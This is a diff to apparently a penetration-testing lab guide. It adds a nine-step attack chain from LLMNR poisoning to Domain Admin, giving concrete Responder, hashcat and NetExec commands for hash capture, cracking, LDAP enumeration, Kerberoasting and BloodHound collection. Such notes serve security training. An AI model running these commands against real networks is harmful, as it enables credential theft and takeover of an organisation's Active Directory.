@@ -10,6 +10,62 @@ Capture NTLM authentication attempts in a controlled environment.
 
 ---
 
+# 🔥 Attack Chain: LLMNR → Domain Admin
+
+## Step 1: LLMNR Poisoning
+
+sudo responder -I eth0
+
+---
+
+## Step 2: Capture NTLM Hash
+
+- Victim attempts network share
+- Hash captured
+
+---
+
+## Step 3: Crack Hash
+
+hashcat -m 5600 hash.txt rockyou.txt
+
+---
+
+## Step 4: Credential Validation
+
+nxc ldap <IP> -u user -p password
+
+---
+
+## Step 5: Enumerate AD
+
+nxc ldap <IP> -u user -p pass --users
+
+---
+
+## Step 6: Kerberoast
+
+nxc ldap <IP> -u user -p pass --kerberoasting hashes.txt
+
+---
+
+## Step 7: BloodHound
+
+nxc ldap <IP> -u user -p pass --bloodhound --collection All
+
+---
+
+## Step 8: Privilege Escalation
+
+- Identify DA path
+- Abuse group membership / ACL
+
+---
+
+## Step 9: Domain Admin Access
+
+- Full control of AD
+
 ## 🧭 Workflow (High-Level)
 
 1. Monitor network traffic
